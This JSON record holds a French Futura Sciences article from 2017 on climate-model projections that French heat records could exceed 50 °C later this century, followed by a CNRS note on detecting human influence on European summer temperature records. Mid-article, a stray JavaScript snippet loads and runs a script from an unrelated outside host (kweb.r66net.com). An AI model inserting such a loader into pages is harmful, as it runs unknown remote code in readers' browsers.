{"title": "Des records de température de plus de 50 °C en France ?", "newspaper": "Futura Sciences", "author": "Yves Fouquart", "date_publi": "04/08/2017", "content": "Selon une étude concernant la France métropolitaine, il faut s'attendre, dans les décennies à venir, à des vagues de chaleur à la fois plus nombreuses et plus intenses. Les records d'aujourd'hui devraient être largement dépassés, avec des maxima pouvant atteindre 50 °C, une valeur actuellement très exceptionnelle en Europe. Ce qu'il faut retenir Des modèles climatiques régionaux, alimentés par des modèles globaux, permettent de prévoir les fréquences et les intensités des canicules sur un maillage de la Métropole pour les décennies à venir. Selon une étude tout juste publiée, ces modèles indiquent une augmentation du nombre de records de chaleur estivale. Alors que le record de température actuel en France métropolitaine est de 42 °C, il devrait atteindre 50 °C après 2050. Le  réchauffement du climat  global est un fait avéré : la température moyenne de la planète a augmenté de près d'un degré centigrade depuis le début du XX e  siècle. La cause en est connue : c'est principalement l'activité humaine, avec l'augmentation de l' effet de serre  qui en résulte du fait des  émissions  de CO 2  mais aussi de CH 4  et d'autres  gaz  dits « à  effet de serre  » (GES). Selon toute vraisemblance, ce réchauffement ne va pas s'arrêter mais au contraire s'amplifier dans les années qui viennent, et ce même si les récents accords de Paris étaient réellement mis en œuvre. S'ils l'étaient, cela permettrait de ralentir, ou peut-être de limiter, ce réchauffement, mais en aucun cas de l'arrêter. Or, les conditions climatiques sont déterminantes pour l'habitabilité d'une région donnée. C'est vrai du  climat  moyen mais les extrêmes climatiques le sont tout autant, que ce soit les grandes  sécheresses  ou, à l'inverse, les  précipitations  intenses, les  tempêtes  et les  surcotes  correspondantes mais aussi, bien entendu, les  canicules . Les extrêmes sont plus déterminants encore quand il s'agit de dimensionner des projets d'infrastructures, des ports, des villes nouvelles ou encore en gestion forestière, pour ne citer que quelques exemples. À ce titre, la vague de  chaleur  qui a touché l'Europe occidentale en 2003 a marqué très justement les esprits. Songeons qu'elle a causé la mort de près de 70.000 personnes en Europe, dont 15.000 en France. Elle est marquée par une  anomalie  tout à fait exceptionnelle. Avec le réchauffement en cours, à quoi faut-il s'attendre ? Fréquence des vagues de chaleur en France métropolitaine entre 1980 et aujourd'hui ainsi qu'entre 2040 et 2100, selon deux scénarios du Giec (exposés dans son quatrième rapport), A1B et A2. © Giec, Yves Fouquart                               Des vagues de chaleur plus fréquentes partout en France métropolitaine À l'occasion du cinquième rapport du  Giec , les équipes françaises de Météo-France et de l'IPSL ont participé à l'exercice de comparaison des  modèles climatiques  nommé CMIP5. Les projections de ces modèles sont disponibles sur le  portail   Drias . Cet exercice de comparaison montre par exemple (voir le graphique ci-dessus) que le nombre de  vagues  de chaleur augmente considérablement vers la fin du siècle, et ce même à Lille.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les  modèles climatiques  ne sont pas destinés à étudier des échelles inférieures à celle dite « synoptique », correspondant,  grosso modo , à 1.000 km. Pour un niveau de détail plus élevé, il faut recourir à des modèles régionaux dont l'aire d'étude est plus limitée (par exemple, l'Europe au lieu de la planète) mais dont la maille élémentaire descend jusqu'à la dizaine de kilomètres. On alimente alors le modèle régional par les sorties d'un modèle climatique. C'est ce qu'ont fait des chercheurs du CNRM (Centre national de recherches météorologiques) et du Cerfacs (Centre européen de recherche et de formation en calcul scientifique), dont le travail est publié dans la revue  Environmental Resources Letters . Le modèle régional est le modèle Aladin, développé par Météo-France, la résolution y est de 12,5 km et le modèle climatique est celui développé par le CNRM. Les deux modèles ont la même base  physique , ce qui assure une certaine homogénéité et une meilleure adaptation du modèle régional au rappel du modèle climatique. À ce jour, les records de température en France métropolitaine dépassent légèrement les 42 °C. Le modèle régional a d'abord été utilisé avec les conditions climatiques actuelles (2005). Il a alors simulé des records de température très voisins dans les cinq régions climatiques identifiées par une méthode  «  clusters  »  (considérant des zones suffisamment similaires) : le  bassin  méditerranéen, le Nord-Ouest, la Bretagne, l'Est et le Sud-Ouest. Nombre de records de chaleur battus dans le futur en France métropolitaine pour la période juin à août selon le scénario RCP 8.5 du Giec (rapport n° 5). © Margot Bador  et al. ,  Environmental Research Letters                               Les records de chaleur actuels seront battus de plus de 10 °C Le modèle a été nourri par les sorties du modèle climatique pour le XXI e  siècle. Le graphique ci-dessus montre bien l'augmentation du nombre de  records de chaleur  battus vers la fin du siècle. Trois vagues de chaleur sont notamment marquantes : 2075, 2097 et 2099. Attention, ces dates n'ont pas de signification ; les modèles climatiques captent une tendance générale mais n'ont aucune capacité prévisionnelle. En d'autres termes, 2075 pourrait tout aussi bien être 2080 ou n'importe quelle année dans cette période-là. Il est très important de conserver cela en tête. Les auteurs se sont donc plus particulièrement intéressés à la  vague de chaleur  de 2075. Les cartes ci-dessous montrent que cette vague affecte surtout le Nord-Est, où les records de température précédents sont battus parfois de plus de 6 °C et jusqu'à 10 °C. Vingt simulations ont été faites en modifiant un peu les conditions initiales (c'est-à-dire, en pratique, celles de début mai). Toutes les simulations, sauf une, confirment la vague de chaleur et le record de chaleur dans le Nord-Est est battu jusqu'à près de 13 °C. Dans ces conditions, les températures maximales atteindraient, et même dépasseraient, les 50 °C ! Devant de tels chiffres, la première réaction est l'incrédulité. Comme le disait un passionné de  météo  récemment :  « En Europe, de nos jours, même dans les sites les plus chauds en été, 50 °C est vraiment le maximum à peine frôlé par endroits en Andalousie, ponctuellement en Sicile ou en Grèce, alors que ces zones ont des températures moyennes estivales 6, 8 voire 10 °C plus hautes que dans une grande partie de la France » . Les auteurs de l'article ont sans doute eu la même réaction. En analysant les facteurs importants dans l'établissement de ces très fortes chaleurs, ils ont montré, ou plutôt confirmé, que la sécheresse des sols était l'élément déterminant dans l'amplitude des vagues de chaleur. En d'autres termes, une vague de chaleur est d'autant plus forte qu'elle est précédée d'un printemps sec, un résultat déjà bien connu avec les vagues de 1976 et 2003 en particulier. Cartes des records de chaleur en été en France métropolitaine. Les valeurs, en degrés Celsius, indiquent les écarts de températures entre les records de paires d'années. La carte a, en haut à gauche, montre les résultats (observés) pour 2002 et 2003. Les cartes b et c montrent les résultats pour les années 2074 et 2075 ; elles s'appuient sur la simulation Aladin-SCEN. La carte b montre les résultats regroupés par zones et la carte c les valeurs calculées pour chaque point de la grille. Les points noirs indiquent ceux où n'apparaît aucune différence de température notable entre les maxima de ces deux années. © Margot Bador  et al. ,  Environmental Research Letters                       Pour prédire les climats futurs, le passé ne suffit plus Que penser de ces résultats ? En premier lieu, il s'agit du scénario le plus pessimiste quant aux  émissions de GES , proche du «  Business As Usual  ». Les accords de Paris marquent une prise de conscience du fait qu'il vaudrait mieux éviter ce scénario-là et il n'est pas inéluctable. Au-delà de ces accords, il semble bien qu'une transition commence à s'opérer, qui permettrait de limiter quelque peu les émissions. En témoigne la stagnation des émissions de CO 2  depuis trois ans. Les arguments historiques sont de peu de valeur : le climat est maintenant largement sorti de la variabilité qu'on a pu lui connaître ces dernières décennies. Pour retrouver des conditions comparables pour l'effet de serre, il faut remonter à des périodes où l'Homme n'était pas présent. Définitivement, le passé ne permet pas de prévoir l'avenir... même si, naturellement, il peut y contribuer. Le modèle climatique du CNRM a une sensibilité climatique qui le situe dans la moyenne des modèles (3,3 °C à l'équilibre), mais il reste possible qu'il surestime les  sécheresses  par exemple. On notera aussi que cette étude n'a pas abordé un autre point tout à fait capital quant aux vagues de chaleur : le cas de températures élevées accompagnées de forte humidité. Or, ces conditions sont extrêmement sévères pour les organismes. Il n'en reste pas moins que cette étude a l'incontestable mérite de nous donner une idée réaliste de ce qui pourrait arriver. À nous d'éviter cela ou de nous y adapter ou, de préférence, les deux. Pour en savoir plus Des records de température sont attendus ces prochains étés Communiqué du CNRS publié le 17 janvier 2016 L'occurrence des records de chaleur durant l'été, en Europe, avant 2100 devrait être multipliée par dix par rapport à celle attendue en l'absence d'influence humaine. Cela se ressentirait dès 2030. Quant à l'occurrence des records froids, elle deviendrait quasi nulle. Des chercheurs ont analysé les projections pour notre siècle de l'évolution des records de température estivale en Europe. Résultat : l'occurrence des records de chaleur durant l'été en Europe avant 2100 (comme les  canicules récentes  des années 2003 et 2015 caractérisées par l'établissement de  records de température estivale  pour de très nombreuses stations de mesure) serait multipliée par dix par rapport à celle attendue en l'absence d'influence humaine, alors que celle des records froids deviendrait quasi nulle. L'évolution de ces records peut être considérée comme un marqueur spécifique des changements futurs des épisodes caniculaires. Les scientifiques ont également estimé à partir de quand il leur serait possible de détecter l'influence anthropique (c'est-à-dire celle de l'Homme) sur l'évolution des records de  température  estivale en Europe : dès 2020 pour les records froids et dès 2030 pour les records chauds. Les chercheurs en question sont issus du laboratoire Climat, environnement, couplages et incertitudes (CECI, CNRS-Cerfacs). Pour arriver à ce résultat, ils ont mis au point une méthodologie originale pour dater l' émergence  de l'influence humaine sur l'évolution des records de température.  Ils ont tout d'abord utilisé un ensemble de 53 simulations climatiques contraintes par le même scénario d' émission des gaz à effet de serre  et des  aérosols  dit du « laisser-faire » (croissance continue, sans limite ni atténuation, de la  concentration des gaz à effet de serre  et des aérosols dans l' atmosphère ). À partir de ces simulations, ils ont estimé l'évolution de l'occurrence des records de température estivale au cours du XXI e  siècle. Les projections climatiques prévoient pour la fin ce siècle, une occurrence moyenne des records chauds 10 fois supérieure aux probabilités d'occurrence attendues dans un climat stationnaire, tel celui de la première moitié du XX e  siècle, et une quasi-disparition des records froids à l'échelle de l'Europe. Ils ont également analysé l'évolution de l'occurrence de ces records de 1900 à 2100, à partir des températures observées et des températures simulées. Outre un bon accord entre modèles et observations, il s'avère que l'évolution de l'occurrence des records reste proche de celle d'un climat stationnaire jusqu'aux années 1990 avant de s'en écarter progressivement tout au long du XXI e  siècle. Évolution de l’occurrence normalisée des records de température estivale en Europe : occurrence observée, modélisée avec le scénario du « laisser-faire » et calculée pour un climat stationnaire (enveloppe grisée). © CNRS                       Des records chauds à cause de l'Homme vers 2030 Afin de mieux prendre en compte l'effet possible de la variabilité interne du climat aux échelles multidécennales dans l'estimation de la date d'émergence de l' influence humaine , les chercheurs ont ensuite eu recours à des simulations climatiques dites de contrôle. Ces simulations d'un climat stationnaire n'étant soumises qu'à des forçages externes, naturels et anthropiques, constants et égaux à leurs valeurs préindustrielles, la variabilité climatique simulée est donc purement d'origine interne. Ces nombreuses simulations ont permis aux chercheurs de définir une plage de valeurs possibles (ou intervalle de confiance) pour l'occurrence des records de température sous un climat stationnaire soumis à l'influence unique de la variabilité interne, et ce pour toutes les dates depuis 1900. La date d'émergence est alors simplement définie par la date à partir de laquelle l'occurrence des records sous l'hypothèse du scénario d'émission dit du « laisser-faire » sort significativement de l'intervalle de confiance.  Cette date d'émergence est de 2020 pour les records froids et de 2030 pour les records chauds avec une incertitude de ± 20 ans, dont une moitié (± 10 ans) est liée à l'utilisation des modèles climatiques et à leur reproduction imparfaite de la réalité et l'autre moitié au caractère chaotique du système climatique. Alors que l'influence anthropique sur les températures globales moyennes a déjà pu être détectée, ce n'est donc qu'à partir de 2030 ± 20 ans (2020 ± 20 ans) que les chercheurs pourront détecter et donc attribuer l'évolution de l'occurrence des records chauds (froids) de température estivale en Europe à l'influence humaine. L'étude a été publiée dans  Geophysical Research Letters . Réchauffement : la mer monte sous l’œil des satellites du CLS                       Le niveau des mers augmente à une vitesse moyenne de 3,3 mm par an et pourrait, selon certains experts, augmenter de plusieurs mètres dans un futur lointain. Afin de comprendre ce phénomène, CLS, une filière du Cnes, effectue par satellite de nombreuses observations que nous vous invitons à découvrir ici en vidéo.                                       ", "theme": "planete"}